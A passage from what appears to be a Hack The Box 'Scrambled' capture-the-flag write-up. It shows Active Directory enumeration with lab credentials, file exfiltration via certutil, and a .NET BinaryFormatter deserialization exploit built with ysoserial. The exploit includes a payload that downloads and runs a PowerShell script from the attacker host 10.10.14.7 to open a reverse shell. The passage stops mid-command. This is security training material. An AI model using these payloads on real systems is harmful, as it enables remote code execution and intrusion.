font-style: inherit;">15</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">09</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2018</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">08</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span>                <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Start</span> Menu                                        </span>
<span id="cb34-10">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">15</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">09</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2018</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">08</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span>                Templates</span></code></pre></div>
<p>Testing to analyze the AD with <code>SharpHound</code> is unsuccessful, no output is provided:</p>
<div class="sourceCode" id="cb35" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> curl http://10.10.14.7/SharpHound.exe <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\S</span>harpHound.exe </span>
<span id="cb35-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> curl http://10.10.14.7/SharpHound.ps1 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\S</span>harpHound.ps1</span>
<span id="cb35-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> ls</span>
<span id="cb35-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Mode</span>                LastWriteTime         Length Name                                              </span>
<span id="cb35-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">----</span>                <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-------------</span>         <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">------</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">----</span>                                              </span>
<span id="cb35-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-a----</span>       15/09/2022     14:15        1051648 SharpHound.exe</span>
<span id="cb35-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-a----</span>       15/09/2022     14:20        1318097 SharpHound.ps1 </span>
<span id="cb35-8"></span>
<span id="cb35-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> SharpHound.exe <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-CollectionMethod</span> All <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Domain</span> scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-LDAPUser</span> miscsvc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-LDAPPass</span> ScrambledEggs9900</span>
<span id="cb35-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> SharpHound.ps1 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-CollectionMethod</span> All <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Domain</span> scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-LDAPUser</span> miscsvc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-LDAPPass</span> ScrambledEggs9900</span></code></pre></div>
<p>We find the custom directory <code>C:\Program Files\ScrambleCorp</code> however it’s empty.. This took me way to long to find, but we’re now able to enumerate the SMB shares under <code>C:\Shares</code>.</p>
<div class="sourceCode" id="cb36" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb36-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Shares\IT<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span></span>
<span id="cb36-2">Mode                LastWriteTime         Length Name                                              </span>
<span id="cb36-3"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-------------</span>         <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">------</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                                              </span>
<span id="cb36-4">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">03</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2021</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">21</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">06</span>                Apps                                              </span>
<span id="cb36-5">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">03</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2021</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">32</span>                Logs                                              </span>
<span id="cb36-6">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">03</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2021</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">32</span>                Reports </span>
<span id="cb36-7"></span>
<span id="cb36-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Shares\IT\Apps\Sales Order Client<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span></span>
<span id="cb36-9">Mode                LastWriteTime         Length Name                                              </span>
<span id="cb36-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-------------</span>         <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">------</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                                              </span>
<span id="cb36-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">05</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2021</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">20</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">52</span>          <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">86528</span> ScrambleClient<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span>                                </span>
<span id="cb36-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">05</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2021</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">20</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">52</span>          <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19456</span> ScrambleLib<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">dll</span> </span></code></pre></div>
<p>An interesting <code>.exe</code> and <code>.dll</code> in a path that’s unquoted, this is interesting! Download the two files to your attacking machine.</p>
<p>Being unable to download the files using <code>nc.exe</code>/<code>nc64.exe</code> I setup a local SMB Server out of desperation:</p>
<div class="sourceCode" id="cb37" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  share sudo adduser <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--system</span> shareuser</span>
<span id="cb37-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Adding</span> system user <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">shareuser</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' (UID 130) ...</span></span>
<span id="cb37-3"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Adding new user `shareuser'</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UID</span> 130<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">with</span> group <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span>nogroup<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' ...</span></span>
<span id="cb37-4"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Creating home directory `/home/shareuser'</span> ...</span>
<span id="cb37-5"></span>
<span id="cb37-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  /srv sudo mkdir share</span>
<span id="cb37-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  /srv sudo chmod 777 share</span>
<span id="cb37-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  /srv sudo chown <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-R</span> shareuser:nogroup /srv/share</span>
<span id="cb37-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  /srv sudo vim /etc/samba/smb.conf</span>
<span id="cb37-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  /srv cat /etc/samba/smb.conf</span>
<span id="cb37-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[global]</span></span>
<span id="cb37-12">   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">client</span> min protocol = SMB2</span>
<span id="cb37-13">   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">client</span> max protocol = SMB3</span>
<span id="cb37-14"></span>
<span id="cb37-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[share]</span></span>
<span id="cb37-16">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">path</span> = /srv/share</span>
<span id="cb37-17">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">writable</span> = yes</span>
<span id="cb37-18">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">browsable</span> = yes</span>
<span id="cb37-19">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">public</span> = yes</span>
<span id="cb37-20">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">create</span> mask = 0644</span>
<span id="cb37-21">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">directory</span> mask = 0755</span>
<span id="cb37-22">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">force</span> user = shareuser</span>
<span id="cb37-23"></span>
<span id="cb37-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  /srv service smbd restart</span>
<span id="cb37-25"></span>
<span id="cb37-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"test"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\\</span>10.10.14.7\share\test</span></code></pre></div>
<p>I doesn’t work either… being a bit annoyed I opted towards <code>certutil.exe</code> and encoded the files and copy-pasted them.</p>
<div class="sourceCode" id="cb38" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> certutil.exe <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-encode</span> ScrambleClient.exe ScrambleClient.exe.b64</span>
<span id="cb38-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Input</span> Length = 86528</span>
<span id="cb38-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Output</span> Length = 119034</span>
<span id="cb38-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CertUtil:</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-encode</span> command completed successfully.</span>
<span id="cb38-5"></span>
<span id="cb38-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\T</span>emp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> certutil.exe <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-encode</span> ScrambleLib.dll ScrambleLib.dll.b64</span>
<span id="cb38-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Input</span> Length = 19456</span>
<span id="cb38-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Output</span> Length = 26812</span>
<span id="cb38-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CertUtil:</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-encode</span> command completed successfully.</span>
<span id="cb38-10"></span>
<span id="cb38-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled vim ScrambleClient.exe.b64</span>
<span id="cb38-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled vim ScrambleLib.dll.b64</span>
<span id="cb38-13"></span>
<span id="cb38-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled cat ScrambleClient.exe.b64<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">base64</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> ScrambleClient.exe</span>
<span id="cb38-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled cat ScrambleLib.dll.b64<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">base64</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> ScrambleLib.dll</span></code></pre></div>
</section>
<section id="step-2---dig-deep-with-ilspy-dnspy" class="level3">
<h3 class="anchored" data-anchor-id="step-2---dig-deep-with-ilspy-dnspy">Step 2 - Dig deep with ilspy / DNSpy</h3>
<p>Analyze <code>.exe</code> and <code>.dll</code> with <code>ilspy</code> or <code>DNSpy</code> in a Windows VM. Briefly looking over the <code>.dll</code> we find static methods for serializing and deserializing data:</p>
<p><img src="https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/images/scrambled06.png" class="img-fluid"></p>
<p>This is a big red flag for me as deserialization often leads to juicy input vulnerabilities. Reading about .NET BinaryFormatter vulnerabilities I find <a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide">this post</a> from Microsoft confirming my thoughts, and <a href="https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7">this medium post</a> showing how we can exploit this.</p>
<p>But before we get into exploiting, we need to identify a method that handles input data. There is one method that looks promising - <code>UploadOrder(SalesOrder)</code>. Analyzing <code>UploadOrder(SalesOrder)</code> we see that the input string is not parameterized or handled in anyway before it’s sent to the method <code>SerializeToBase64()</code>.</p>
<p><img src="https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/images/scrambled07.png" class="img-fluid"></p>
<p>We should be able to exploit this with <code>ysoserial.exe</code> to get code execution. Generate a reverses shell payload just like earlier and create the payload using <code>ysoserial.exe</code>:</p>
<div class="sourceCode" id="cb39" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb39-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\tools\ysoserial-1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">35</span>\Release<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>\ysoserial<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>f BinaryFormatter <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>o base64 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>g WindowsIdentity <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>c <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"powershell -e JABjAGwAaQ..."</span></span>
<span id="cb39-2">AAEAAAD<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/////</span>AQ<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span></span></code></pre></div>
<p>Upload the new order:</p>
<div class="sourceCode" id="cb40" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb40-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled nc scramble.htb 4411</span>
<span id="cb40-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SCRAMBLECORP_ORDERS_V1.0.3</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb40-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UPLOAD_ORDER</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">AAEAAAD/////AQ...</span></span>
<span id="cb40-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ERROR_GENERAL</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Error</span> deserializing sales order: Invalid length for a Base-64 char array or string.</span></code></pre></div>
<p>Not sure if this fails because we’re using the base64 payload, lets try a simpler payload.</p>
<div class="sourceCode" id="cb41" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb41-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\tools\ysoserial-1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">35</span>\Release<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>\ysoserial<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>f BinaryFormatter <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>o base64 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>g WindowsIdentity <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>c <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"powershell iex(new-object system.net.webclient).downloadstring('http://10.10.14.7/rev.ps1')"</span></span>
<span id="cb41-2">AAEAAAD<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/////</span>AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAuApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBaWdZOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCdmQyVnljMmhsYkd3Z2FXVjRLRzVsZHkxdlltcGxZM1FnYzNsemRHVnRMbTVsZEM1M1pXSmpiR2xsYm5RcExtUnZkMjVzYjJGa2MzUnlhVzVuS0Nkb2RIUndPaTh2TVRBdU1UQXVNVFF1Tnk5eVpYWXVjSE14SnlraUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span></span></code></pre></div>
<div class="sourceCode" id="cb42" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb42-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled nc scramble.htb 4411</span>
<span id="cb42-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SCRAMBLECORP_ORDERS_V1.0.3</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb42-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UPLOAD_ORDER</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
